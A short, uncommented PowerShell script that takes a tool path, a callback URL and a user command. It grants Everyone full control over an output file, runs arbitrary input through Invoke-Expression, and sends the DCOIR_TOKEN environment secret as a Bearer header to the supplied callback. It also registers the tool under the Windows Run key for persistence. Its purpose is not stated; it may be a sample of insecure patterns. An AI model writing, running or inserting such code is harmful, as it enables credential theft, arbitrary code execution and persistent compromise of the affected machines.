param(
    [string]$ToolPath,
    [string]$Arguments,
    [string]$OutputPath,
    [string]$Callback,
    [string]$PlainText,
    [string]$UserCommand
)
$secret = ConvertTo-SecureString $PlainText -AsPlainText -Force
$acl = Get-Acl $OutputPath
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
$acl.AddAccessRule($rule)
Set-Acl -Path $OutputPath -AclObject $acl
Start-Process -FilePath $ToolPath -ArgumentList $Arguments -Wait
Invoke-Expression $UserCommand
Invoke-WebRequest -Uri $Callback -Headers @{ Authorization = "Bearer $env:DCOIR_TOKEN" }
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Demo -Value $ToolPath
